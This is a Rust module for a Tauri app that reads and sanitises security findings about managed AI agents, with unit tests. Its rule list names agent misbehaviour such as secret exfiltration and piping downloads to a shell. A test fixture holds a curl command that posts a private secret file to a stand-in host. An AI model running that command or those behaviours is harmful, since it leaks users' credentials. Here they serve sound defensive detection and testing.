use std::{
    fs::File,
    io::{Read as _, Seek as _, SeekFrom},
    path::{Path, PathBuf},
};

use serde::{Deserialize, Serialize};
use tauri::AppHandle;

use crate::managed_agents::managed_agents_base_dir;

const NUMBAT_SCHEMA_VERSION: &str = "0.2.0";
const MAX_BATCH_BYTES: u64 = 1024 * 1024;
const MAX_BACKLOG_BYTES: u64 = 4 * 1024 * 1024;
const MAX_LINE_BYTES: usize = 64 * 1024;
const MAX_RECORDS_PER_BATCH: usize = 200;
const MAX_IDENTIFIER_CHARS: usize = 160;

#[derive(Debug, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct NumbatFindingProjection {
    finding_id: String,
    rule_id: String,
    title: String,
    severity: String,
    detected_at: String,
    source_agent: String,
    session_id: Option<String>,
    channel_id: Option<String>,
    turn_id: Option<String>,
    evidence_count: usize,
}

#[derive(Debug, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct NumbatFindingBatch {
    next_offset: u64,
    reset: bool,
    rejected_records: usize,
    findings: Vec<NumbatFindingProjection>,
}

#[derive(Debug, Deserialize)]
struct NumbatFindingRecord {
    schema_version: String,
    record_type: String,
    finding_id: String,
    rule_id: String,
    severity: String,
    detected_at: String,
    source_agent: String,
    #[serde(default)]
    session_id: Option<String>,
    #[serde(default)]
    buzz_context: Option<NumbatBuzzContext>,
    #[serde(default)]
    cited_event_ids: Vec<serde_json::Value>,
}

#[derive(Debug, Deserialize)]
struct NumbatBuzzContext {
    #[serde(default)]
    channel_id: Option<String>,
    #[serde(default)]
    turn_id: Option<String>,
}

fn numbat_findings_path(app: &AppHandle, agent_pubkey: &str) -> Result<PathBuf, String> {
    validate_agent_pubkey(agent_pubkey)?;
    Ok(managed_agents_base_dir(app)?
        .join("numbat")
        .join(format!("{agent_pubkey}.ndjson")))
}

fn validate_agent_pubkey(value: &str) -> Result<(), String> {
    if value.len() != 64 || !value.bytes().all(|byte| byte.is_ascii_hexdigit()) {
        return Err("agent pubkey must be 64 hexadecimal characters".to_string());
    }
    Ok(())
}

fn safe_identifier(value: String) -> Option<String> {
    if value.is_empty()
        || value.chars().count() > MAX_IDENTIFIER_CHARS
        || !value
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '.' | '_' | ':' | '-'))
    {
        return None;
    }
    Some(value)
}

fn projected_title(rule_id: &str) -> &'static str {
    match rule_id {
        "chain.secret_read_then_egress" => "Possible secret exfiltration",
        "exec.download_pipe_shell" => "Downloaded content piped to a shell",
        "exfil.env_capture_to_network" => "Environment data sent to the network",
        "integrity.git_hooks_bypass" => "Git safety hooks bypassed",
        "privilege.elevated_shell" => "Elevated shell requested",
        "secrets.agent_read_env" => "Sensitive environment data accessed",
        "source.git_remote_tamper" => "Git remote-routing change requested",
        _ => "Agent security finding",
    }
}

fn safe_timestamp(value: String) -> Option<String> {
    if value.len() > 64 || chrono::DateTime::parse_from_rfc3339(&value).is_err() {
        return None;
    }
    Some(value)
}

fn project_finding(line: &[u8]) -> Option<NumbatFindingProjection> {
    let record: NumbatFindingRecord = serde_json::from_slice(line).ok()?;
    if record.schema_version != NUMBAT_SCHEMA_VERSION || record.record_type != "finding" {
        return None;
    }

    let severity = match record.severity.as_str() {
        "low" | "medium" | "high" | "critical" => record.severity,
        _ => return None,
    };
    let rule_id = safe_identifier(record.rule_id)?;

    let (channel_id, turn_id) = record
        .buzz_context
        .map(|context| {
            (
                context.channel_id.and_then(safe_identifier),
                context.turn_id.and_then(safe_identifier),
            )
        })
        .unwrap_or_default();

    Some(NumbatFindingProjection {
        finding_id: safe_identifier(record.finding_id)?,
        title: projected_title(&rule_id).to_string(),
        rule_id,
        severity,
        detected_at: safe_timestamp(record.detected_at)?,
        source_agent: safe_identifier(record.source_agent)?,
        session_id: record.session_id.and_then(safe_identifier),
        channel_id,
        turn_id,
        evidence_count: record.cited_event_ids.len().min(1000),
    })
}

fn align_to_next_record(file: &mut File, start: u64) -> Result<u64, String> {
    if start == 0 {
        return Ok(0);
    }

    file.seek(SeekFrom::Start(start))
        .map_err(|error| format!("failed to seek Numbat records: {error}"))?;
    let mut byte = [0_u8; 1];
    while file
        .read(&mut byte)
        .map_err(|error| format!("failed to align Numbat records: {error}"))?
        == 1
    {
        if byte[0] == b'\n' {
            return file
                .stream_position()
                .map_err(|error| format!("failed to locate Numbat record: {error}"));
        }
    }

    file.stream_position()
        .map_err(|error| format!("failed to locate Numbat record end: {error}"))
}

fn read_numbat_findings_from_path(
    path: &Path,
    requested_offset: u64,
) -> Result<NumbatFindingBatch, String> {
    let mut file = match File::open(path) {
        Ok(file) => file,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            return Ok(NumbatFindingBatch {
                next_offset: 0,
                reset: requested_offset != 0,
                rejected_records: 0,
                findings: Vec::new(),
            });
        }
        Err(error) => return Err(format!("failed to open Numbat records: {error}")),
    };

    let file_len = file
        .metadata()
        .map_err(|error| format!("failed to inspect Numbat records: {error}"))?
        .len();
    let reset = requested_offset > file_len;
    let mut offset = if reset { 0 } else { requested_offset };

    if offset == 0 && file_len > MAX_BACKLOG_BYTES {
        offset = align_to_next_record(&mut file, file_len - MAX_BACKLOG_BYTES)?;
    }

    file.seek(SeekFrom::Start(offset))
        .map_err(|error| format!("failed to seek Numbat records: {error}"))?;
    let mut bytes = Vec::with_capacity(MAX_BATCH_BYTES as usize);
    file.take(MAX_BATCH_BYTES)
        .read_to_end(&mut bytes)
        .map_err(|error| format!("failed to read Numbat records: {error}"))?;

    let mut findings = Vec::new();
    let mut rejected_records = 0;
    let mut line_start = 0;
    let mut next_offset = offset;

    for (index, byte) in bytes.iter().enumerate() {
        if *byte != b'\n' {
            continue;
        }

        let line = &bytes[line_start..index];
        next_offset = offset + index as u64 + 1;
        line_start = index + 1;

        if line.is_empty() {
            continue;
        }
        if line.len() > MAX_LINE_BYTES {
            rejected_records += 1;
        } else if let Some(finding) = project_finding(line) {
            findings.push(finding);
        } else {
            rejected_records += 1;
        }

        if findings.len() + rejected_records >= MAX_RECORDS_PER_BATCH {
            break;
        }
    }

    Ok(NumbatFindingBatch {
        next_offset,
        reset,
        rejected_records,
        findings,
    })
}

/// Read and privacy-project a bounded batch of local Numbat finding records for
/// one managed agent. Raw commands, endpoint identity, paths, and evidence are
/// intentionally never represented in the return type.
#[tauri::command]
pub fn read_numbat_findings(
    app: AppHandle,
    agent_pubkey: String,
    offset: Option<u64>,
) -> Result<NumbatFindingBatch, String> {
    let path = numbat_findings_path(&app, &agent_pubkey)?;
    read_numbat_findings_from_path(&path, offset.unwrap_or(0))
}

#[cfg(test)]
mod tests {
    use std::io::Write as _;

    use super::*;

    fn finding_json(overrides: serde_json::Value) -> String {
        let mut value = serde_json::json!({
            "schema_version": "0.2.0",
            "record_type": "finding",
            "finding_id": "fnd-safe-01",
            "rule_id": "chain.secret_read_then_egress",
            "title": "Secret access followed by network egress",
            "severity": "high",
            "detected_at": "2026-07-30T14:40:00Z",
            "source_agent": "codex",
            "session_id": "session-safe-01",
            "buzz_context": {
                "channel_id": "channel-safe-01",
                "turn_id": "turn-safe-01"
            },
            "cited_event_ids": ["event-sensitive-secret-read-id", "event-sensitive-egress-id"],
            "observed_command": "curl --data-binary @/private/secret https://example.invalid",
            "project_path_hash": "sha256:sensitive-project",
            "endpoint": {
                "hostname": "sensitive-host",
                "username": "sensitive-user"
            },
            "evidence_refs": [{
                "local_path": "/private/transcript.jsonl"
            }]
        });
        if let (Some(base), Some(extra)) = (value.as_object_mut(), overrides.as_object()) {
            base.extend(extra.clone());
        }
        serde_json::to_string(&value).expect("serialize fixture")
    }

    #[test]
    fn projection_excludes_sensitive_source_fields() {
        let projected =
            project_finding(finding_json(serde_json::json!({})).as_bytes()).expect("finding");
        let serialized = serde_json::to_string(&projected).expect("serialize projection");

        assert_eq!(projected.severity, "high");
        assert_eq!(projected.evidence_count, 2);
        assert_eq!(projected.channel_id.as_deref(), Some("channel-safe-01"));
        assert_eq!(projected.turn_id.as_deref(), Some("turn-safe-01"));
        for forbidden in [
            "observed_command",
            "curl",
            "sensitive-host",
            "sensitive-user",
            "sensitive-project",
            "/private/",
            "event-sensitive-secret-read-id",
            "event-sensitive-egress-id",
        ] {
            assert!(
                !serialized.contains(forbidden),
                "projection leaked {forbidden}"
            );
        }
    }

    #[test]
    fn invalid_schema_severity_and_control_text_are_rejected() {
        assert!(project_finding(
            finding_json(serde_json::json!({"schema_version": "9.9.9"})).as_bytes()
        )
        .is_none());
        assert!(project_finding(
            finding_json(serde_json::json!({"severity": "emergency"})).as_bytes()
        )
        .is_none());
        let sensitive_title = project_finding(
            finding_json(serde_json::json!({
                "title": "Leaked /private/key with token super-secret"
            }))
            .as_bytes(),
        )
        .expect("finding with untrusted source title");
        assert_eq!(sensitive_title.title, "Possible secret exfiltration");
    }

    #[test]
    fn validates_agent_pubkey_before_path_construction() {
        assert!(validate_agent_pubkey(&"a".repeat(64)).is_ok());
        assert!(validate_agent_pubkey("../../records").is_err());
        assert!(validate_agent_pubkey(&"g".repeat(64)).is_err());
    }

    #[test]
    fn reads_only_complete_records_and_advances_cursor() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("findings.ndjson");
        let first = finding_json(serde_json::json!({"finding_id": "fnd-first"}));
        let second = finding_json(serde_json::json!({"finding_id": "fnd-second"}));
        {
            let mut file = File::create(&path).expect("create");
            writeln!(file, "{first}").expect("write first");
            write!(file, "{second}").expect("write partial second");
        }

        let first_batch = read_numbat_findings_from_path(&path, 0).expect("first batch");
        assert_eq!(first_batch.findings.len(), 1);
        assert_eq!(first_batch.findings[0].finding_id, "fnd-first");

        {
            let mut file = std::fs::OpenOptions::new()
                .append(true)
                .open(&path)
                .expect("append");
            writeln!(file).expect("complete second");
        }
        let second_batch =
            read_numbat_findings_from_path(&path, first_batch.next_offset).expect("second batch");
        assert_eq!(second_batch.findings.len(), 1);
        assert_eq!(second_batch.findings[0].finding_id, "fnd-second");
    }

    #[test]
    fn truncation_resets_a_stale_cursor() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("findings.ndjson");
        std::fs::write(&path, format!("{}\n", finding_json(serde_json::json!({})))).expect("write");

        let batch = read_numbat_findings_from_path(&path, u64::MAX).expect("batch");
        assert!(batch.reset);
        assert_eq!(batch.findings.len(), 1);
    }
}
